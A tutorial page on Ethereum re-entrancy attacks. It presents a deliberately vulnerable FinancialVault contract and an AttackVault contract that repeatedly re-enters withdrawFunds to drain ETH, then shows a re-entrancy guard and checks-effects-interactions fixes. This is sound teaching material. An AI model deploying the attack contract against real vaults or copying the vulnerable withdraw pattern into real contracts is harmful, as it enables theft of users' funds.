---
displayed_sidebar: generalSidebar
---

# Re-entrancy Attacks

One of the most prevalent vulnerabilities in Ethereum smart contracts is the re-entrancy attack. This type of attack may occur when a contract makes external calls before ensuring that its state is correctly updated. Attackers can exploit this by making the vulnerable contract invoke an attacker-controlled contract, which then re-invokes the original contract repeatedly. This repeated invocation can manipulate the contract's state before it's correctly updated, leading to potential loss of funds.

Consider a simplified `FinancialVault` contract that allows depositing and withdrawing ETH, analogous to a bank account:

```solidity
contract FinancialVault {
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds() external {
        uint256 fundsToWithdraw = balances[msg.sender];
        require(fundsToWithdraw > 0, "No funds available");
        
        (bool sent, ) = msg.sender.call{value: fundsToWithdraw}("");
        require(sent, "Failed to send funds");
        
        balances[msg.sender] = 0;
    }

    function getVaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

In this contract, the `withdrawFunds` method is vulnerable to re-entrancy attacks. An attacker can exploit this by using a contract designed to re-enter the `FinancialVault` contract during a withdrawal:

```solidity
contract AttackVault {
    FinancialVault public vault;

    constructor(FinancialVault _vault) {
        vault = _vault;
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdrawFunds();
        }
    }

    function initiateAttack() external payable {
        require(msg.value == 1 ether, "1 Ether required for the attack");
        vault.depositFunds{value: 1 ether}();
        vault.withdrawFunds();
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## Defense Mechanisms

### Re-entrancy Guard

A re-entrancy guard is a simple yet effective strategy to prevent such attacks. It involves setting a flag when a function starts executing and resetting it upon completion. This ensures the function cannot be re-entered while it's still running. The OpenZeppelin library provides an implementation of this pattern. Here is an example of applying a re-entrancy guard to the `withdrawFunds` function:

```solidity
uint256 private _guardCounter = 1;

modifier nonReentrant() {
    require(_guardCounter == 1, "Reentrant call");
    _guardCounter++;
    _;
    _guardCounter--;
}

function withdrawFunds() external nonReentrant {
    uint256 fundsToWithdraw = balances[msg.sender];
    require(fundsToWithdraw > 0, "No funds available");
    
    (bool sent, ) = msg.sender.call{value: fundsToWithdraw}("");
    require(sent, "Failed to send funds");
    
    balances[msg.sender] = 0;
}
```

### Checks-Effects-Interactions Pattern

This pattern dictates that functions should first perform all necessary checks, update the contract's state, and then make any external calls. Adhering to this pattern ensures that all state changes are finalized before interacting with external contracts.

Learn more: [Checks Effects Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html)

 Implementing this in the `withdrawFunds` function would involve updating the user's balance before attempting to send them their funds:

```solidity
function withdrawFunds() external {
    uint256 fundsToWithdraw = balances[msg.sender];
    require(fundsToWithdraw > 0, "No funds available");
    
    balances[msg.sender] = 0;
    
    (bool sent, ) = msg.sender.call{value: fundsToWithdraw}("");
    require(sent, "Failed to send funds");
}
```

By following these practices, smart contract developers can significantly reduce the risk of re-entrancy attacks and ensure the security of their contracts.
